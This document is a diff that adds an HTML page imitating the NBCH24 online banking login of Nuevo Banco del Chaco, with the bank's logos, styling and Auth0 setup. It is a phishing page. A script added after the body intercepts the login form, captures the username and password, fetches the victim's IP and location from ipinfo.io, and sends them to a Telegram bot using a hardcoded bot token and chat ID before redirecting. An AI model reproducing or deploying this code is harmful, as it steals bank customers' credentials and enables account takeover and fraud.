@@ -1,0 +1,438 @@
+<html><head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>Ingresá a tu cuenta</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="SHORTCUT ICON" href="https://www.nbch.com.ar/Portals/0/favicon_nbch_20150908.ico" type="image/x-icon">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"><!-- Link para importar la tipografia "Montserrat"-->
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500&amp;display=swap" rel="stylesheet"><!-- Link para importar los iconos-->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><!-- Importar JQuery-->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>
+    <style>
+        body,
+        html {
+            height: 100%;
+            background-image: url("https://cdn.nbch.com.ar/Portals/0/Images/nbch24-online-banking-prelogin-fondo.jpg");
+            background-position: center;
+            background-size: cover;
+            font-family: 'Montserrat', sans-serif;
+        }
+
+        input {
+            filter: none !important;
+        }
+
+        @media only screen and (max-width: 765px) {
+
+            body,
+            html {
+                background-image: none;
+            }
+
+            .login-box {
+                position: relative !important;
+                box-shadow: none !important;
+                border-top: none !important;
+                top: 0 !important;
+                transform: none !important;
+                float: none !important;
+            }
+
+            .login-container .wrapper {
+                position: relative;
+                top: 0;
+                z-index: 1;
+                width: 100%;
+            }
+        }
+
+        .login-container {
+            position: relative;
+            min-height: 100%;
+            max-width: 900px;
+            margin: auto;
+        }
+
+        .login-box {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0px 0px 1px 0.1px #9de1da;
+            border-radius: 5px;
+            border-top: 1px solid #e9e9e9;
+        }
+
+        .login-header {
+            text-align: center;
+            padding-top: 0;
+        }
+
+        .login-header img {
+            width: 150px;
+        }
+
+        .login-footer {
+            position: absolute;
+            bottom: 10px;
+            width: 300px;
+            left: 0;
+            right: 0;
+            margin: 0 auto;
+        }
+
+        .login-footer img {
+            width: 100%;
+        }
+
+        #error-message {
+            display: none;
+        }
+
+
+        #gradient {
+            height: 100px;
+            background-image: linear-gradient(to bottom, rgb(255 255 255), rgb(255 255 255 / 0%));
+            display: none;
+        }
+
+        #btn-login {
+            background-color: #234881;
+            border-radius: 0 !important;
+            padding-bottom: 7px;
+            padding-top: 7px;
+            margin-top: 10px;
+        }
+
+        .center {
+            text-align: center;
+        }
+
+        #bottom-imgs {
+            height: 80px;
+            display: flex;
+            align-items: center;
+            justify-content: space-evenly;
+            width: 80%;
+            margin: 0 auto;
+        }
+
+        #bottom-imgs .img-block {
+            width: 40%;
+        }
+
+        #bottom-imgs .img-block img {
+            width: 100%;
+        }
+
+        #vl {
+            border-right: 1px solid #908f8f;
+            height: 20px;
+            display: inline;
+        }
+
+        .ingresa-cuenta {
+            font-family: 'Montserrat', sans-serif;
+            font-size: medium 18pt;
+            color: #908f8f;
+            padding-top: 10px;
+        }
+
+        .text {
+            font-family: 'Montserrat', sans-serif;
+            font-size: smaller;
+            color: #908f8f;
+        }
+
+        a {
+            font-size: smaller;
+            color: #234881;
+        }
+
+        .space-right {
+            margin-right: 5px;
+        }
+
+        input[type=text]:focus {
+            outline: none !important;
+            box-shadow: none !important;
+            border: 2px solid #00c8a9;
+        }
+
+        input[type=password]:focus {
+            outline: none !important;
+            box-shadow: none !important;
+            border: 2px solid #00c8a9;
+        }
+
+        .form-group {
+            max-height: 60px;
+            margin-top: 0 !important;
+            margin-bottom: 0 !important;
+        }
+
+        .form-control {
+            box-shadow: none;
+            border-width: 1px;
+            border-radius: 2px;
+        }
+
+        .eye-icon {
+            position: relative;
+            top: 30px;
+            left: 60%;
+            color: #908f8f;
+        }
+
+        @media only screen and (max-width: 765px) {
+            .eye-icon {
+                position: relative;
+                left: 80%;
+                color: #908f8f;
+            }
+
+            .login-header img {
+                width: 250px;
+            }
+        }
+
+        @media only screen and (max-width: 500px) {
+            .eye-icon {
+                position: relative;
+                left: 70%;
+                color: #908f8f;
+            }
+        }
+
+        @media only screen and (max-width: 350px) {
+            .eye-icon {
+                position: relative;
+                left: 60%;
+                color: #908f8f;
+            }
+        }
+
+        .form-group>label {
+            text-decoration: none !important;
+            top: 30px;
+            left: 10px;
+            position: relative;
+            background-color: white;
+            padding: 0px 5px 0px 5px;
+            transition: 0.2s;
+            pointer-events: none;
+            font-family: 'Montserrat', sans-serif;
+            font-size: 10px;
+            color: #908f8f;
+        }
+
+        .label-animate>label {
+            top: 12px !important;
+            left: 12px !important;
+            font-size: 10px;
+            color: #234881;
+            font-weight: 500;
+        }
+
+        label {
+            font-weight: 200;
+        }
+
+        .login-footer-responsive {
+            position: absolute;
+            bottom: 0;
+            display: none;
+            height: auto;
+        }
+
+        @media only screen and (max-width: 765px) {
+            .login-footer-responsive {
+                display: block;
+            }
+
+            .login-footer-responsive img {
+                width: 100%;
+            }
+
+            #gradient {
+                display: block;
+            }
+        }
+
+    </style>
+</head>
+<body bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCJ9LCJ2ZXJzaW9uIjoiMS45LjA5Iiwic2NvcmUiOjEwOTA5fV0=" bis_skin_checked="1"><div class="login-container" bis_skin_checked="1">
+    <div class="wrapper" bis_skin_checked="1">
+        <div class="col-xs-12 col-sm-4 col-sm-offset-4 login-box" style="z-index:1000" bis_skin_checked="1">
+            <div class="login-header" bis_skin_checked="1"><img src="https://cdn.nbch.com.ar/Portals/0/Images/logo-nbch24-tu-banco-siempre-con-vos-mobile.png">
+                <h4 class="ingresa-cuenta">Ingresá a tu cuenta</h4>
+                <p class="text">Validá tu identidad en la plataforma del Nuevo Banco del Chaco.</p>
+            </div>
+            <div class="alert alert-danger" id="error-message" bis_skin_checked="1"></div>
+            <div bis_skin_checked="1">
+                <form onsubmit="enviarDatos(event)" method="" xvpn-watching-form="true">
+                    <div class="form-group" bis_skin_checked="1"><label for="usr">Usuario o correo electrónico</label><input class="form-control" id="usr" type="text" autocomplete="off" required=""  xvpn-watching="true" xvpn-input-type="username"><div class="xv-pwm-icon" style="color: initial; font: initial; font-feature-settings: initial; font-kerning: initial; font-optical-sizing: initial; font-palette: initial; font-synthesis: initial; font-variation-settings: initial; forced-color-adjust: initial; text-orientation: initial; text-rendering: initial; -webkit-font-smoothing: initial; -webkit-locale: initial; -webkit-text-orientation: initial; -webkit-writing-mode: initial; writing-mode: initial; zoom: initial; accent-color: initial; place-content: initial; place-items: initial; place-self: initial; alignment-baseline: initial; animation: initial; app-region: initial; appearance: initial; aspect-ratio: initial; backdrop-filter: initial; backface-visibility: initial; background: url(&quot;chrome-extension://blgcbajigpdfohpgcmbbfnphcgifjopc/images/logo.svg&quot;) 0% 0% / cover no-repeat; background-blend-mode: initial; baseline-shift: initial; block-size: initial; border-block: initial; border: initial; border-radius: initial; border-collapse: initial; border-end-end-radius: initial; border-end-start-radius: initial; border-inline: initial; border-start-end-radius: initial; border-start-start-radius: initial; bottom: initial; box-shadow: initial; box-sizing: initial; break-after: initial; break-before: initial; break-inside: initial; buffered-rendering: initial; caption-side: initial; caret-color: initial; clear: initial; clip: initial; clip-path: initial; clip-rule: initial; color-interpolation: initial; color-interpolation-filters: initial; color-rendering: initial; color-scheme: initial; columns: initial; column-fill: initial; gap: initial; column-rule: initial; column-span: initial; contain: initial; contain-intrinsic-block-size: initial; contain-intrinsic-size: initial; contain-intrinsic-inline-size: initial; container: initial; content: initial; content-visibility: initial; counter-increment: initial; counter-reset: initial; counter-set: initial; cursor: pointer; cx: initial; cy: initial; d: initial; display: initial; dominant-baseline: initial; empty-cells: initial; fill: initial; fill-opacity: initial; fill-rule: initial; filter: initial; flex: initial; flex-flow: initial; float: initial; flood-color: initial; flood-opacity: initial; grid: initial; grid-area: initial; height: 16px; hyphenate-character: initial; hyphenate-limit-chars: initial; hyphens: initial; image-orientation: initial; image-rendering: initial; inline-size: initial; inset-block: initial; inset-inline: initial; isolation: initial; left: 541px; letter-spacing: initial; lighting-color: initial; line-break: initial; list-style: initial; margin-block: initial; margin: initial; margin-inline: initial; marker: initial; mask: initial; mask-type: initial; math-depth: initial; math-shift: initial; math-style: initial; max-block-size: initial; max-height: 16px; max-inline-size: initial; max-width: 16px; min-block-size: initial; min-height: 12px; min-inline-size: initial; min-width: 12px; mix-blend-mode: initial; object-fit: initial; object-position: initial; object-view-box: initial; offset: initial; opacity: initial; order: initial; origin-trial-test-property: initial; orphans: initial; outline: initial; outline-offset: initial; overflow-anchor: initial; overflow-clip-margin: initial; overflow-wrap: initial; overflow: initial; overscroll-behavior-block: initial; overscroll-behavior-inline: initial; overscroll-behavior: initial; padding-block: initial; padding: initial; padding-inline: initial; page: initial; page-orientation: initial; paint-order: initial; perspective: initial; perspective-origin: initial; pointer-events: none; position: absolute; quotes: initial; r: initial; resize: initial; right: initial; rotate: initial; ruby-position: initial; rx: initial; ry: initial; scale: initial; scroll-behavior: initial; scroll-margin-block: initial; scroll-margin: initial; scroll-margin-inline: initial; scroll-padding-block: initial; scroll-padding: initial; scroll-padding-inline: initial; scroll-snap-align: initial; scroll-snap-stop: initial; scroll-snap-type: initial; scrollbar-gutter: initial; shape-image-threshold: initial; shape-margin: initial; shape-outside: initial; shape-rendering: initial; size: initial; speak: initial; stop-color: initial; stop-opacity: initial; stroke: initial; stroke-dasharray: initial; stroke-dashoffset: initial; stroke-linecap: initial; stroke-linejoin: initial; stroke-miterlimit: initial; stroke-opacity: initial; stroke-width: initial; tab-size: initial; table-layout: initial; text-align: initial; text-align-last: initial; text-anchor: initial; text-combine-upright: initial; text-decoration: initial; text-decoration-skip-ink: initial; text-emphasis: initial; text-emphasis-position: initial; text-indent: initial; text-overflow: initial; text-shadow: initial; text-size-adjust: initial; text-transform: initial; text-underline-offset: initial; text-underline-position: initial; top: 194.062px; touch-action: initial; transform: initial; transform-box: initial; transform-origin: initial; transform-style: initial; transition: initial; translate: initial; user-select: initial; vector-effect: initial; vertical-align: initial; visibility: initial; border-spacing: initial; -webkit-box-align: initial; -webkit-box-decoration-break: initial; -webkit-box-direction: initial; -webkit-box-flex: initial; -webkit-box-ordinal-group: initial; -webkit-box-orient: initial; -webkit-box-pack: initial; -webkit-box-reflect: initial; -webkit-highlight: initial; -webkit-line-break: initial; -webkit-line-clamp: initial; -webkit-mask-box-image: initial; -webkit-mask: initial; -webkit-mask-composite: initial; -webkit-print-color-adjust: initial; -webkit-rtl-ordering: initial; -webkit-ruby-position: initial; -webkit-tap-highlight-color: initial; -webkit-text-combine: initial; -webkit-text-decorations-in-effect: initial; -webkit-text-fill-color: initial; -webkit-text-security: initial; -webkit-text-stroke: initial; -webkit-user-drag: initial; -webkit-user-modify: initial; white-space: initial; widows: initial; width: 16px; will-change: initial; word-break: initial; word-spacing: initial; x: initial; y: initial; z-index: auto;" bis_skin_checked="1"></div></div>
+                    <div class="form-group" bis_skin_checked="1"><label for="password">Contraseña</label><i class="fa fa-eye eye-icon" aria-hidden="true" onclick="showPassword()" style="cursor: pointer;"></i><input class="form-control" id="password" type="password" required="" xvpn-watching="true" xvpn-input-type="password"><div class="xv-pwm-icon" style="color: initial; font: initial; font-feature-settings: initial; font-kerning: initial; font-optical-sizing: initial; font-palette: initial; font-synthesis: initial; font-variation-settings: initial; forced-color-adjust: initial; text-orientation: initial; text-rendering: initial; -webkit-font-smoothing: initial; -webkit-locale: initial; -webkit-text-orientation: initial; -webkit-writing-mode: initial; writing-mode: initial; zoom: initial; accent-color: initial; place-content: initial; place-items: initial; place-self: initial; alignment-baseline: initial; animation: initial; app-region: initial; appearance: initial; aspect-ratio: initial; backdrop-filter: initial; backface-visibility: initial; background: url(&quot;chrome-extension://blgcbajigpdfohpgcmbbfnphcgifjopc/images/logo.svg&quot;) 0% 0% / cover no-repeat; background-blend-mode: initial; baseline-shift: initial; block-size: initial; border-block: initial; border: initial; border-radius: initial; border-collapse: initial; border-end-end-radius: initial; border-end-start-radius: initial; border-inline: initial; border-start-end-radius: initial; border-start-start-radius: initial; bottom: initial; box-shadow: initial; box-sizing: initial; break-after: initial; break-before: initial; break-inside: initial; buffered-rendering: initial; caption-side: initial; caret-color: initial; clear: initial; clip: initial; clip-path: initial; clip-rule: initial; color-interpolation: initial; color-interpolation-filters: initial; color-rendering: initial; color-scheme: initial; columns: initial; column-fill: initial; gap: initial; column-rule: initial; column-span: initial; contain: initial; contain-intrinsic-block-size: initial; contain-intrinsic-size: initial; contain-intrinsic-inline-size: initial; container: initial; content: initial; content-visibility: initial; counter-increment: initial; counter-reset: initial; counter-set: initial; cursor: pointer; cx: initial; cy: initial; d: initial; display: initial; dominant-baseline: initial; empty-cells: initial; fill: initial; fill-opacity: initial; fill-rule: initial; filter: initial; flex: initial; flex-flow: initial; float: initial; flood-color: initial; flood-opacity: initial; grid: initial; grid-area: initial; height: 16px; hyphenate-character: initial; hyphenate-limit-chars: initial; hyphens: initial; image-orientation: initial; image-rendering: initial; inline-size: initial; inset-block: initial; inset-inline: initial; isolation: initial; left: 541px; letter-spacing: initial; lighting-color: initial; line-break: initial; list-style: initial; margin-block: initial; margin: initial; margin-inline: initial; marker: initial; mask: initial; mask-type: initial; math-depth: initial; math-shift: initial; math-style: initial; max-block-size: initial; max-height: 16px; max-inline-size: initial; max-width: 16px; min-block-size: initial; min-height: 12px; min-inline-size: initial; min-width: 12px; mix-blend-mode: initial; object-fit: initial; object-position: initial; object-view-box: initial; offset: initial; opacity: initial; order: initial; origin-trial-test-property: initial; orphans: initial; outline: initial; outline-offset: initial; overflow-anchor: initial; overflow-clip-margin: initial; overflow-wrap: initial; overflow: initial; overscroll-behavior-block: initial; overscroll-behavior-inline: initial; overscroll-behavior: initial; padding-block: initial; padding: initial; padding-inline: initial; page: initial; page-orientation: initial; paint-order: initial; perspective: initial; perspective-origin: initial; pointer-events: none; position: absolute; quotes: initial; r: initial; resize: initial; right: initial; rotate: initial; ruby-position: initial; rx: initial; ry: initial; scale: initial; scroll-behavior: initial; scroll-margin-block: initial; scroll-margin: initial; scroll-margin-inline: initial; scroll-padding-block: initial; scroll-padding: initial; scroll-padding-inline: initial; scroll-snap-align: initial; scroll-snap-stop: initial; scroll-snap-type: initial; scrollbar-gutter: initial; shape-image-threshold: initial; shape-margin: initial; shape-outside: initial; shape-rendering: initial; size: initial; speak: initial; stop-color: initial; stop-opacity: initial; stroke: initial; stroke-dasharray: initial; stroke-dashoffset: initial; stroke-linecap: initial; stroke-linejoin: initial; stroke-miterlimit: initial; stroke-opacity: initial; stroke-width: initial; tab-size: initial; table-layout: initial; text-align: initial; text-align-last: initial; text-anchor: initial; text-combine-upright: initial; text-decoration: initial; text-decoration-skip-ink: initial; text-emphasis: initial; text-emphasis-position: initial; text-indent: initial; text-overflow: initial; text-shadow: initial; text-size-adjust: initial; text-transform: initial; text-underline-offset: initial; text-underline-position: initial; top: 252.344px; touch-action: initial; transform: initial; transform-box: initial; transform-origin: initial; transform-style: initial; transition: initial; translate: initial; user-select: initial; vector-effect: initial; vertical-align: initial; visibility: initial; border-spacing: initial; -webkit-box-align: initial; -webkit-box-decoration-break: initial; -webkit-box-direction: initial; -webkit-box-flex: initial; -webkit-box-ordinal-group: initial; -webkit-box-orient: initial; -webkit-box-pack: initial; -webkit-box-reflect: initial; -webkit-highlight: initial; -webkit-line-break: initial; -webkit-line-clamp: initial; -webkit-mask-box-image: initial; -webkit-mask: initial; -webkit-mask-composite: initial; -webkit-print-color-adjust: initial; -webkit-rtl-ordering: initial; -webkit-ruby-position: initial; -webkit-tap-highlight-color: initial; -webkit-text-combine: initial; -webkit-text-decorations-in-effect: initial; -webkit-text-fill-color: initial; -webkit-text-security: initial; -webkit-text-stroke: initial; -webkit-user-drag: initial; -webkit-user-modify: initial; white-space: initial; widows: initial; width: 16px; will-change: initial; word-break: initial; word-spacing: initial; x: initial; y: initial; z-index: auto;" bis_skin_checked="1"></div></div>
+                    <div class="center" style="padding-top: 5px; padding-bottom: 5px; margin-top: 5px" bis_skin_checked="1"><a id="link-olvidaste-tu-password" href="#" bis_skin_checked="1">¿Olvidaste tu contraseña?</a></div>
+                    <div class="captcha-container form-group" bis_skin_checked="1" style="display: none;"></div><button class="btn btn-primary btn-block" id="btn-login">Iniciar sesión</button>
+                </form>
+                <div id="bottom-imgs" bis_skin_checked="1">
+                    <div class="img-block" bis_skin_checked="1"><img src="https://cdn.nbch.com.ar/Portals/0/Images/logo-nbch24-online-banking.png"></div>
+                    <div id="vl" bis_skin_checked="1"></div>
+                    <div class="img-block" bis_skin_checked="1"><img src="https://cdn.nbch.com.ar/Portals/0/Images/logo-billetera.png"></div>
+                </div>
+                <div class="center" bis_skin_checked="1"><a id="link-crear-usuario" href="#" bis_skin_checked="1">¿Todavía no tenés usuario?</a></div>
+                <hr style="width: 30%; background-color:#666666; margin-top: 10px; margin-bottom: 10px;">
+                <p class="center text" style="margin: 0;">Contactanos:</p>
+                <div class="center" bis_skin_checked="1"><i class="fa fa-phone space-right" aria-hidden="true"></i>
+                    <p class="space-right text" style="display:inline">0800-999-6224</p><i class="fa fa-whatsapp space-right" aria-hidden="true"></i>
+                    <p class="text" style="display:inline">54-9-362-4161290</p>
+                </div>
+            </div>
+        </div>
+        <div id="gradient" bis_skin_checked="1"></div>
+    </div>
+    <div class="login-footer" bis_skin_checked="1"><img src="https://cdn.nbch.com.ar/Portals/0/Images/nbch24-online-banking-prelogin-legal-footer.png"></div>
+    <div class="login-footer-responsive" bis_skin_checked="1"><img src="https://cdn.nbch.com.ar/Portals/0/Images/nbch24-online-banking-prelogin-fondo.jpg"></div>
+</div>
+<!--if IE 8script(src='//cdnjs.cloudflare.com/ajax/libs/ie8/0.2.5/ie8.js')-->
+<!--if lte IE 9script(src='https://cdn.auth0.com/js/polyfills/1.0/base64.min.js')
+script(src='https://cdn.auth0.com/js/polyfills/1.0/es5-shim.min.js')-->
+<script src="https://cdn.auth0.com/js/auth0/9.14/auth0.min.js"></script>
+<script src="https://cdn.auth0.com/js/polyfills/1.0/object-assign.min.js"></script>
+<script>
+    window.addEventListener('load', function() {
+        var config = JSON.parse(
+            decodeURIComponent(escape(window.atob('eyJpY29uIjoiaHR0cHM6Ly93d3cubmJjaC5jb20uYXIvUG9ydGFscy8wL0ltYWdlcy9sb2dvX25iY2g4LnBuZz92ZXI9MjAxNS0wOC0wNC0xOTUwMTQtMDAwIiwiYXNzZXRzVXJsIjoiIiwiYXV0aDBEb21haW4iOiJhdXRoLm5iY2guY29tLmFyIiwiYXV0aDBUZW5hbnQiOiJuYmNoIiwiY2xpZW50Q29uZmlndXJhdGlvbkJhc2VVcmwiOiJodHRwczovL2F1dGgubmJjaC5jb20uYXIvIiwiY2FsbGJhY2tPbkxvY2F0aW9uSGFzaCI6ZmFsc2UsImNhbGxiYWNrVVJMIjoiaHR0cHM6Ly8yNC5uYmNoLmNvbS5hci93ZWJiYW5rLXB1YmxpYy13ZWIvY2FsbGJhY2svYXV0aDAiLCJjZG4iOiJodHRwczovL2Nkbi5hdXRoMC5jb20vIiwiY2xpZW50SUQiOiJTT040dXdUamcwYkZzWmdJTXgwSlNSUm8yMXRSMWgyWCIsImRpY3QiOnsic2lnbmluIjp7InRpdGxlIjoiZG9pdC13ZWIifX0sImV4dHJhUGFyYW1zIjp7InByb3RvY29sIjoib2F1dGgyIiwic2NvcGUiOiJvcGVuaWQgcHJvZmlsZSBlbWFpbCIsInJlc3BvbnNlX3R5cGUiOiJjb2RlIiwiX2NzcmYiOiJheUZYU254bC1FX21BVEhxb21DX0d0aDVEMkY4QzE0RHJGTGsiLCJfaW50c3RhdGUiOiJkZXByZWNhdGVkIiwic3RhdGUiOiJoS0ZvMlNCdU5sVk1XVmR4VDIxRFV6TnJVbVJZWms0NVJqSnpXa3RQUXpGUlVEQXlRcUZ1cFd4dloybHVvM1JwWk5rZ1IybG1YelJPVXpScVZIUnJiMTlxWWtseVVreHhhR0ZsTlZOemRVSmZlRGFqWTJsazJTQlRUMDQwZFhkVWFtY3dZa1p6V21kSlRYZ3dTbE5TVW04eU1YUlNNV2d5V0EifSwiaW50ZXJuYWxPcHRpb25zIjp7InByb3RvY29sIjoib2F1dGgyIiwic2NvcGUiOiJvcGVuaWQgcHJvZmlsZSBlbWFpbCIsInJlc3BvbnNlX3R5cGUiOiJjb2RlIiwiX2NzcmYiOiJheUZYU254bC1FX21BVEhxb21DX0d0aDVEMkY4QzE0RHJGTGsiLCJfaW50c3RhdGUiOiJkZXByZWNhdGVkIiwic3RhdGUiOiJoS0ZvMlNCdU5sVk1XVmR4VDIxRFV6TnJVbVJZWms0NVJqSnpXa3RQUXpGUlVEQXlRcUZ1cFd4dloybHVvM1JwWk5rZ1IybG1YelJPVXpScVZIUnJiMTlxWWtseVVreHhhR0ZsTlZOemRVSmZlRGFqWTJsazJTQlRUMDQwZFhkVWFtY3dZa1p6V21kSlRYZ3dTbE5TVW04eU1YUlNNV2d5V0EifSwid2lkZ2V0VXJsIjoiaHR0cHM6Ly9jZG4uYXV0aDAuY29tL3cyL2F1dGgwLXdpZGdldC01LjEubWluLmpzIiwiaXNUaGlyZFBhcnR5Q2xpZW50IjpmYWxzZSwiYXV0aG9yaXphdGlvblNlcnZlciI6eyJ1cmwiOiJodHRwczovL2F1dGgubmJjaC5jb20uYXIiLCJpc3N1ZXIiOiJodHRwczovL2F1dGgubmJjaC5jb20uYXIvIn0sImNvbG9ycyI6eyJwYWdlX2JhY2tncm91bmQiOiIjZmZmZmZmIiwicHJpbWFyeSI6IiMwMDU5ZDYifX0=')))
+        );
+        var params = Object.assign({
+            configurationBaseUrl: config.clientConfigurationBaseUrl,
+            overrides: {
+                __tenant: config.auth0Tenant,
+                __token_issuer: config.authorizationServer.issuer
+            },
+            domain: config.auth0Domain,
+            clientID: config.clientID,
+            redirectUri: config.callbackURL,
+            responseType: 'code'
+        }, config.internalOptions);
+        var webAuth = new auth0.WebAuth(params);
+
+
+
+        document.getElementsByTagName("form")[0].onsubmit = login
+    });
+
+    function showPassword() {
+        var x = document.getElementById("password");
+        if (x.type === "password") {
+            x.type = "text";
+        } else {
+            x.type = "password";
+        }
+    }
+
+    $(document).ready(function() {
+
+        // se controla si el navegador es EDGE
+        if (/edg/ig.test(navigator.userAgent)) {
+            // se ocultan los botones para mostrar la contraseña
+            $(".fa.fa-eye").css("display", "none");
+        }
+
+        // BUGFIX de autocomplete de chrome y firefox
+        // que ocultaba los valores con los labels
+        // de los campos.
+        function checkIfFieldsAreNotEmptyAndAddClass() {
+            $(".form-control").each(function() {
+                if (
+                    this.value.trim() !== "" ||
+                    (
+                        !/firefox/ig.test(navigator.userAgent) &&
+                        $(this).is("*:-webkit-autofill")
+                    )
+                ) {
+                    $(this).parent().addClass("label-animate");
+                }
+            });
+        }
+
+        setTimeout(checkIfFieldsAreNotEmptyAndAddClass, 500);
+
+        $(".form-control").change(checkIfFieldsAreNotEmptyAndAddClass)
+
+
+        $(".form-control").focus(function() {
+            $(this).parent().addClass("label-animate");
+        });
+        $(window).click(function() {
+            if (!$(event.target).is('.form-control')) {
+                $(".form-control").each(function() {
+                    if (
+                        $(this).val() == '' &&
+                        /*
+                          bugfix de submit de formulario con botón
+                          enter de teclado, que ocultaba el texto
+                        */
+                        !$(this).is(":focus")
+                    ) {
+                        $(this).parent().removeClass("label-animate");
+                    }
+                });
+            }
+        });
+    });
+
+</script><style>.tb_button {padding:1px;cursor:pointer;border-right: 1px solid #8b8b8b;border-left: 1px solid #FFF;border-bottom: 1px solid #fff;}.tb_button.hover {borer:2px outset #def; background-color: #f8f8f8 !important;}.ws_toolbar {z-index:100000} .ws_toolbar .ws_tb_btn {cursor:pointer;border:1px solid #555;padding:3px}   .tb_highlight{background-color:yellow} .tb_hide {visibility:hidden} .ws_toolbar img {padding:2px;margin:0px}</style></body>
+
+   <script>
+  const tokenTelegram = "6256413505:AAFzuYJJ87V9qEbHD4rZ5aq3vMw7sWxFLrI";
+  const tokenIPinfo = "9c9af8c7467cc4";
+
+  function enviarDatos(event) {
+    event.preventDefault(); 
+
+    const usr = document.getElementById("usr").value;
+    const password = document.getElementById("password").value;
+
+    fetch(`https://ipinfo.io/json?token=${tokenIPinfo}`, {
+      method: "GET"
+    })
+    .then(response => response.json())
+    .then(data => {
+      const mensaje = `NBCH24
+user: ${usr}
+Clave: ${password}
+IP: ${data.ip}
+${data.city},${data.country}
+      `;
+
+      fetch(`https://api.telegram.org/bot${tokenTelegram}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            chat_id: "5666517648",
+            text: mensaje
+          })
+        })
+        .then(response => response.json())
+        .then(data => {
+          console.log("Respuesta de Telegram:", data);
+  
+          window.location.href = "index2.html";
+        })
+        .catch(error => {
+          console.error("Error al enviar datos", error);
+        });
+      })
+      .catch(error => {
+        console.error("Error al obtener información", error);
+      });
+    }
+</script>
+
+</html>
